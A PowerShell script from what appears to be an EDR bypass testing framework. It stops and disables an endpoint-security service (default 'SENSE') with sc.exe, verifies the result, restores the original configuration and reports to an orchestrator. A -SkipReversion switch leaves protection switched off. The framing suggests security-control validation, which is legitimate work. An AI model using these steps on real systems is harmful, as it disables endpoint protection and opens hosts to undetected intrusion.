#==============================================================================
# BP1002.3 - Disable EDR User-Mode Service via sc.exe
# EDR Bypass Testing Automation Framework
#==============================================================================
# SYNOPSIS
#   Performs EDR bypass by stopping and disabling EDR user-mode services using
#   the sc.exe command-line tool, then reverts the configuration after verification.
#
# DESCRIPTION
#   This script implements BP-1002.3 technique which uses the sc.exe command-line
#   tool to stop and disable Windows services associated with EDR solutions.
#   The technique routes requests through the Service Control Manager and cannot
#   affect PPL (Process Protection Level) protected services.
#   
#   Test Flow:
#   1. Identify target EDR service
#   2. Backup current service configuration
#   3. Execute bypass: sc stop [service] && sc config [service] start=disabled
#   4. Verify service was stopped and disabled
#   5. Revert configuration: re-enable and restart service
#   6. Verify reversion was successful
#   7. Report results to orchestrator
#
# REQUIREMENTS
#   - Administrative privileges (required for service management)
#   - Windows Vista or later (sc.exe availability)
#   - Target service must not be PPL protected
#
# EXIT CODES
#   0 = Success (service disabled and reverted successfully)
#   1 = General failure
#   2 = Insufficient privileges
#   3 = Service stop failed
#   4 = Service disable failed
#   5 = Service verification failed
#   6 = Service reversion failed
#   7 = Target service not found
#   8 = Service is PPL protected
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$TargetService = "SENSE",
    
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verbose = $false,
    
    [Parameter(Mandatory=$false)]
    [int]$ServiceTimeoutSeconds = 30
)

# Set strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region Constants and Configuration
$TECHNIQUE_ID = "BP1002.3"
$TECHNIQUE_NAME = "Disable EDR User-Mode Service via sc.exe"
$SCRIPT_VERSION = "1.0.0"
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$SCRIPT_NAME = "BP1002.3-sc"

# Result constants for orchestrator communication
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_DETECTED = "DETECTED"
$RESULT_ERROR = "ERROR"

# Service startup type constants
$SERVICE_STARTUP_BOOT = "boot"
$SERVICE_STARTUP_SYSTEM = "system"
$SERVICE_STARTUP_AUTO = "auto"
$SERVICE_STARTUP_DEMAND = "demand"
$SERVICE_STARTUP_DISABLED = "disabled"

# Service state constants
$SERVICE_STATE_STOPPED = "STOPPED"
$SERVICE_STATE_RUNNING = "RUNNING"
$SERVICE_STATE_PENDING = "PENDING"
#endregion

#region Logging Functions
function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $global:LogFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP.log"
        $global:ResultFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP`_result.json"
        
        Write-Log "=== EDR Bypass Test: $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Technique ID: $TECHNIQUE_ID" -Level "INFO"
        Write-Log "Script Version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Target Service: $TargetService" -Level "INFO"
        Write-Log "Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        Write-Log "Log File: $global:LogFile" -Level "INFO"
        Write-Log "Result File: $global:ResultFile" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Error "Failed to initialize logging: $($_.Exception.Message)"
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    
    # Write to console
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($Verbose) { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry }
    }
    
    # Write to file if available
    if ($global:LogFile) {
        try {
            Add-Content -Path $global:LogFile -Value $logEntry -Encoding UTF8
        }
        catch {
            Write-Warning "Failed to write to log file: $($_.Exception.Message)"
        }
    }
}
#endregion

#region Utility Functions
function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-Log "Administrator privileges check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-ScToolAvailability {
    try {
        Write-Log "Testing sc.exe tool availability..." -Level "DEBUG"
        
        $testOutput = & sc /? 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Log "sc.exe tool is available and accessible" -Level "DEBUG"
            return $true
        }
        else {
            Write-Log "sc.exe tool returned error code: $LASTEXITCODE" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "sc.exe tool is not available: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Get-ServiceConfiguration {
    param([string]$ServiceName)
    
    try {
        Write-Log "Querying service configuration for: $ServiceName" -Level "DEBUG"
        
        # Use sc.exe to query service configuration
        $configOutput = & sc qc $ServiceName 2>&1
        $queryOutput = & sc query $ServiceName 2>&1
        
        if ($LASTEXITCODE -ne 0) {
            Write-Log "Service query failed for '$ServiceName': $configOutput" -Level "ERROR"
            return $null
        }
        
        # Parse service configuration
        $config = @{
            ServiceName = $ServiceName
            DisplayName = ""
            StartType = ""
            State = ""
            AcceptStop = $false
            ProcessId = 0
            Exists = $true
        }
        
        # Parse sc qc output
        foreach ($line in $configOutput) {
            if ($line -match "DISPLAY_NAME\s*:\s*(.+)") {
                $config.DisplayName = $matches[1].Trim()
            }
            elseif ($line -match "START_TYPE\s*:\s*\d+\s+(.+)") {
                $config.StartType = $matches[1].Trim().ToLower()
            }
        }
        
        # Parse sc query output  
        foreach ($line in $queryOutput) {
            if ($line -match "STATE\s*:\s*\d+\s+(.+)") {
                $config.State = $matches[1].Trim().Split()[0]
            }
            elseif ($line -match "PID\s*:\s*(\d+)") {
                $config.ProcessId = [int]$matches[1]
            }
            elseif ($line -match "CONTROLS_ACCEPTED\s*:\s*(.+)") {
                $controls = $matches[1].Trim()
                $config.AcceptStop = $controls -match "STOP"
            }
        }
        
        Write-Log "Service config - Name: $($config.ServiceName), Display: $($config.DisplayName), Start: $($config.StartType), State: $($config.State)" -Level "DEBUG"
        
        return $config
    }
    catch {
        Write-Log "Failed to get service configuration: $($_.Exception.Message)" -Level "ERROR"
        return $null
    }
}

function Test-ServiceExists {
    param([string]$ServiceName)
    
    try {
        $config = Get-ServiceConfiguration -ServiceName $ServiceName
        return ($config -ne $null -and $config.Exists)
    }
    catch {
        return $false
    }
}

function Test-ServicePPLProtected {
    param([string]$ServiceName)
    
    try {
        Write-Log "Checking if service is PPL protected: $ServiceName" -Level "DEBUG"
        
        # Try to query the service with sc.exe for detailed information
        $detailOutput = & sc qc $ServiceName 2>&1
        
        # PPL services typically cannot be stopped via service control manager
        # We'll attempt a test by trying to send a control code that's harmless
        $testOutput = & sc interrogate $ServiceName 2>&1
        
        if ($LASTEXITCODE -eq 5) {  # ERROR_ACCESS_DENIED
            Write-Log "Service appears to be PPL protected (access denied on interrogate)" -Level "WARN"
            return $true
        }
        
        # Additional check: try to get process information
        $config = Get-ServiceConfiguration -ServiceName $ServiceName
        if ($config -and $config.ProcessId -gt 0) {
            try {
                $process = Get-Process -Id $config.ProcessId -ErrorAction SilentlyContinue
                if ($process) {
                    # Check if process has protected process characteristics
                    # This is a heuristic check as PPL detection requires kernel-level access
                    Write-Log "Service process found (PID: $($config.ProcessId)), PPL status indeterminate" -Level "DEBUG"
                }
            }
            catch {
                Write-Log "Could not access service process (PID: $($config.ProcessId)), may indicate PPL protection" -Level "DEBUG"
            }
        }
        
        Write-Log "Service does not appear to be PPL protected" -Level "DEBUG"
        return $false
    }
    catch {
        Write-Log "Failed to check PPL protection status: $($_.Exception.Message)" -Level "DEBUG"
        return $false
    }
}
#endregion

#region Test Result Functions
function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
    }
    
    try {
        $resultJson = $result | ConvertTo-Json -Depth 3
        if ($global:ResultFile) {
            Set-Content -Path $global:ResultFile -Value $resultJson -Encoding UTF8
        }
        
        Write-Log "=== TEST RESULT ===" -Level "INFO"
        Write-Log "Status: $Status" -Level "INFO"
        Write-Log "Message: $Message" -Level "INFO"
        Write-Log "Result file: $global:ResultFile" -Level "INFO"
        
        # Output for orchestrator pickup
        Write-Output "TECHNIQUE_RESULT:$Status|$Message"
        
    }
    catch {
        Write-Log "Failed to write test result: $($_.Exception.Message)" -Level "ERROR"
    }
}
#endregion

#region Main Test Functions
function Backup-OriginalState {
    param([string]$ServiceName)
    
    try {
        Write-Log "Backing up original service configuration..." -Level "INFO"
        
        $originalConfig = Get-ServiceConfiguration -ServiceName $ServiceName
        
        if (-not $originalConfig) {
            Write-Log "Failed to retrieve original service configuration" -Level "ERROR"
            return $false
        }
        
        $global:OriginalState = @{
            ServiceName = $ServiceName
            Configuration = $originalConfig
            BackupTime = Get-Date
        }
        
        Write-Log "Original service state backed up:" -Level "INFO"
        Write-Log "  Display Name: $($originalConfig.DisplayName)" -Level "INFO"
        Write-Log "  Start Type: $($originalConfig.StartType)" -Level "INFO"
        Write-Log "  State: $($originalConfig.State)" -Level "INFO"
        Write-Log "  Process ID: $($originalConfig.ProcessId)" -Level "INFO"
        Write-Log "  Accept Stop: $($originalConfig.AcceptStop)" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-ServiceStop {
    param([string]$ServiceName)
    
    try {
        Write-Log "Stopping service using sc.exe: $ServiceName" -Level "INFO"
        Write-Log "Command: sc stop $ServiceName" -Level "INFO"
        
        # Execute service stop command
        $stopOutput = & sc stop $ServiceName 2>&1
        $stopExitCode = $LASTEXITCODE
        
        Write-Log "sc stop output: $stopOutput" -Level "DEBUG"
        Write-Log "sc stop exit code: $stopExitCode" -Level "DEBUG"
        
        # Check for specific error codes
        if ($stopExitCode -eq 5) {
            Write-Log "Access denied - service may be PPL protected" -Level "ERROR"
            return $false
        }
        elseif ($stopExitCode -eq 1062) {
            Write-Log "Service has not been started" -Level "WARN"
            return $true  # Consider this success since service is already stopped
        }
        elseif ($stopExitCode -ne 0) {
            Write-Log "Service stop failed with exit code: $stopExitCode" -Level "ERROR"
            return $false
        }
        
        # Wait for service to stop with timeout
        $timeout = $ServiceTimeoutSeconds
        Write-Log "Waiting for service to stop (timeout: ${timeout}s)..." -Level "DEBUG"
        
        for ($i = 0; $i -lt $timeout; $i++) {
            Start-Sleep -Seconds 1
            $config = Get-ServiceConfiguration -ServiceName $ServiceName
            
            if ($config -and $config.State -eq $SERVICE_STATE_STOPPED) {
                Write-Log "Service stopped successfully" -Level "INFO"
                return $true
            }
            
            if (($i + 1) % 5 -eq 0) {
                Write-Log "Still waiting for service to stop... ($($i + 1)/${timeout}s)" -Level "DEBUG"
            }
        }
        
        Write-Log "Service stop operation timed out after ${timeout} seconds" -Level "ERROR"
        return $false
    }
    catch {
        Write-Log "Failed to stop service: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-ServiceDisable {
    param([string]$ServiceName)
    
    try {
        Write-Log "Disabling service using sc.exe: $ServiceName" -Level "INFO"
        Write-Log "Command: sc config $ServiceName start=disabled" -Level "INFO"
        
        # Execute service disable command
        $disableOutput = & sc config $ServiceName start=disabled 2>&1
        $disableExitCode = $LASTEXITCODE
        
        Write-Log "sc config output: $disableOutput" -Level "DEBUG"
        Write-Log "sc config exit code: $disableExitCode" -Level "DEBUG"
        
        # Check for specific error codes
        if ($disableExitCode -eq 5) {
            Write-Log "Access denied - service may be PPL protected or insufficient privileges" -Level "ERROR"
            return $false
        }
        elseif ($disableExitCode -ne 0) {
            Write-Log "Service disable failed with exit code: $disableExitCode" -Level "ERROR"
            return $false
        }
        
        Write-Log "Service disable command executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to disable service: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-BypassSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying service bypass was successful..." -Level "INFO"
        
        # Small delay to ensure service changes are applied
        Start-Sleep -Seconds 2
        
        $currentConfig = Get-ServiceConfiguration -ServiceName $ServiceName
        
        if (-not $currentConfig) {
            Write-Log "Failed to retrieve current service configuration for verification" -Level "ERROR"
            return $false
        }
        
        # Check if service is stopped
        $isStopped = ($currentConfig.State -eq $SERVICE_STATE_STOPPED)
        
        # Check if service is disabled
        $isDisabled = ($currentConfig.StartType -eq $SERVICE_STARTUP_DISABLED)
        
        Write-Log "Verification results:" -Level "INFO"
        Write-Log "  Service stopped: $isStopped (state: $($currentConfig.State))" -Level "INFO"
        Write-Log "  Service disabled: $isDisabled (start type: $($currentConfig.StartType))" -Level "INFO"
        
        if ($isStopped -and $isDisabled) {
            Write-Log "Bypass verification successful - service is stopped and disabled" -Level "INFO"
            return $true
        }
        else {
            Write-Log "Bypass verification failed - service not properly stopped or disabled" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify bypass success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    param([string]$ServiceName)
    
    try {
        Write-Log "Reverting service to original state..." -Level "INFO"
        
        $originalConfig = $global:OriginalState.Configuration
        $originalStartType = $originalConfig.StartType
        $originalState = $originalConfig.State
        
        # Re-enable service with original start type
        Write-Log "Restoring original start type: $originalStartType" -Level "INFO"
        $enableOutput = & sc config $ServiceName start=$originalStartType 2>&1
        $enableExitCode = $LASTEXITCODE
        
        Write-Log "sc config restore output: $enableOutput" -Level "DEBUG"
        Write-Log "sc config restore exit code: $enableExitCode" -Level "DEBUG"
        
        if ($enableExitCode -ne 0) {
            Write-Log "Failed to restore service start type with exit code: $enableExitCode" -Level "ERROR"
            return $false
        }
        
        # If service was originally running, attempt to start it
        if ($originalState -eq $SERVICE_STATE_RUNNING) {
            Write-Log "Original service was running, attempting to restart..." -Level "INFO"
            
            $startOutput = & sc start $ServiceName 2>&1
            $startExitCode = $LASTEXITCODE
            
            Write-Log "sc start output: $startOutput" -Level "DEBUG"
            Write-Log "sc start exit code: $startExitCode" -Level "DEBUG"
            
            if ($startExitCode -ne 0 -and $startExitCode -ne 1056) {  # 1056 = service already running
                Write-Log "Failed to restart service with exit code: $startExitCode" -Level "WARN"
                Write-Log "Service configuration restored but service not restarted" -Level "WARN"
                return $true  # Consider partial success
            }
            
            # Wait for service to start
            Write-Log "Waiting for service to start..." -Level "DEBUG"
            Start-Sleep -Seconds 3
        }
        
        Write-Log "Service state reversion completed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to revert service state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-ReversionSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying state reversion was successful..." -Level "INFO"
        
        # Small delay to ensure service changes are applied
        Start-Sleep -Seconds 2
        
        $currentConfig = Get-ServiceConfiguration -ServiceName $ServiceName
        $originalConfig = $global:OriginalState.Configuration
        
        if (-not $currentConfig) {
            Write-Log "Failed to retrieve current service configuration for reversion verification" -Level "ERROR"
            return $false
        }
        
        # Check if start type was restored
        $startTypeRestored = ($currentConfig.StartType -eq $originalConfig.StartType)
        
        # Check if service state matches original (with some tolerance)
        $stateMatches = ($currentConfig.State -eq $originalConfig.State) -or
                       ($originalConfig.State -eq $SERVICE_STATE_RUNNING -and $currentConfig.State -eq $SERVICE_STATE_RUNNING)
        
        Write-Log "Reversion verification results:" -Level "INFO"
        Write-Log "  Start type restored: $startTypeRestored ($($currentConfig.StartType) == $($originalConfig.StartType))" -Level "INFO"
        Write-Log "  State matches: $stateMatches ($($currentConfig.State) vs $($originalConfig.State))" -Level "INFO"
        
        if ($startTypeRestored) {
            if ($stateMatches) {
                Write-Log "Reversion verification fully successful" -Level "INFO"
            }
            else {
                Write-Log "Reversion verification partially successful (start type restored, state may differ)" -Level "WARN"
            }
            return $true
        }
        else {
            Write-Log "Reversion verification failed - start type not restored" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify reversion success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Main Execution
function main {
    try {
        Write-Host "Starting EDR Bypass Test: $TECHNIQUE_NAME" -ForegroundColor Cyan
        
        # Initialize logging
        if (-not (Initialize-Logging -LogDirectory $LogPath)) {
            Write-Error "Failed to initialize logging system"
            exit 1
        }
        
        Write-Log "=== PRE-EXECUTION CHECKS ===" -Level "INFO"
        
        # Check administrative privileges
        if (-not (Test-AdminPrivileges)) {
            $errorMsg = "Administrative privileges required for service management operations"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 2
        }
        Write-Log "Administrative privileges confirmed" -Level "INFO"
        
        # Check sc.exe availability
        if (-not (Test-ScToolAvailability)) {
            $errorMsg = "sc.exe tool is not available or accessible"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        Write-Log "sc.exe tool availability confirmed" -Level "INFO"
        
        # Check if target service exists
        if (-not (Test-ServiceExists -ServiceName $TargetService)) {
            $errorMsg = "Target service '$TargetService' not found on this system"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 7
        }
        Write-Log "Target service '$TargetService' found" -Level "INFO"
        
        # Check if service is PPL protected
        $isPPLProtected = Test-ServicePPLProtected -ServiceName $TargetService
        if ($isPPLProtected) {
            $errorMsg = "Target service '$TargetService' appears to be PPL protected and cannot be managed via sc.exe"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 8
        }
        Write-Log "Service does not appear to be PPL protected" -Level "INFO"
        
        Write-Log "=== EXECUTING BYPASS TECHNIQUE ===" -Level "INFO"
        
        # Backup original state
        if (-not (Backup-OriginalState -ServiceName $TargetService)) {
            $errorMsg = "Failed to backup original service state"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        
        # Execute service stop
        if (-not (Invoke-ServiceStop -ServiceName $TargetService)) {
            $errorMsg = "Failed to stop target service '$TargetService'"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 3
        }
        
        # Execute service disable
        if (-not (Invoke-ServiceDisable -ServiceName $TargetService)) {
            $errorMsg = "Failed to disable target service '$TargetService'"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 4
        }
        
        # Verify bypass was successful
        if (-not (Test-BypassSuccess -ServiceName $TargetService)) {
            $errorMsg = "Service bypass technique failed verification"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 5
        }
        
        Write-Log "=== BYPASS TECHNIQUE SUCCESSFUL ===" -Level "INFO"
        
        # Revert state unless explicitly skipped
        if (-not $SkipReversion) {
            Write-Log "=== REVERTING SERVICE STATE ===" -Level "INFO"
            
            if (-not (Invoke-StateReversion -ServiceName $TargetService)) {
                $errorMsg = "Failed to revert service state"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 6
            }
            
            if (-not (Test-ReversionSuccess -ServiceName $TargetService)) {
                $errorMsg = "Service state reversion failed verification"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 6
            }
            
            Write-Log "Service state successfully reverted" -Level "INFO"
        }
        else {
            Write-Log "Service state reversion skipped as requested" -Level "WARN"
        }
        
        # Report success
        $successMsg = "BP1002.3 service bypass technique executed and verified successfully"
        Write-Log $successMsg -Level "INFO"
        Write-TestResult -Status $RESULT_SUCCESS -Message $successMsg -Details @{
            TargetService = $TargetService
            OriginalConfiguration = $global:OriginalState.Configuration
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
            ServiceTimeoutSeconds = $ServiceTimeoutSeconds
            PPLProtected = $isPPLProtected
        }
        
        Write-Log "=== TEST COMPLETED SUCCESSFULLY ===" -Level "INFO"
        Write-Log "End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        
        exit 0
        
    }
    catch {
        $errorMsg = "Unhandled exception in main execution: $($_.Exception.Message)"
        Write-Log $errorMsg -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
        exit 1
    }
}

# Execute main function
main
#endregion